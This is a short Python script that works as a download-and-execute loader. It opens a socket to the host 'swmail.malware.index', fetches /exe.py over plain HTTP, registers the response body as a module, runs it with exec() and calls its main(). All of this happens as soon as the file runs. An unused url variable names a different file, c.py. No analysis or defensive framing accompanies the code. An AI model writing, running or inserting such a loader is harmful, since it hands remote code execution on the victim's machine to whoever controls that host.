import sys
import types
import socket

def execute():
    url = "http://swmail.malware.index/c.py"
    module_name = "t"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("swmail.malware.index", 80))
    sock.send(b"GET /exe.py HTTP/1.1\r\nHost: swmail.malware.index\r\n\r\n")

    data = b""
    while True:
        chunk = sock.recv(1024)
        if not chunk:
            break
        data += chunk

    source = data.decode().split("\r\n\r\n", 1)[-1]

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
